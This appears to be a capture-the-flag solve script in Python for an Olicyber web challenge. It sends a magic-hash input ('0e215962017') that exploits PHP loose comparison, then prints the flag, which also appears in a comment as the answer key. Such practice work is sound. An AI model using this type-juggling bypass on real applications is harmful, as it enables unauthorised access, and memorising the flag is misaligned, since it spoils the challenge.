import requests
import re

site = "http://confuse-me.challs.olicyber.it/"

r = requests.get(f"{site}/?input=0e215962017").text

match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{0mg_php_c0mp4r150n_r34lly_5uck5}
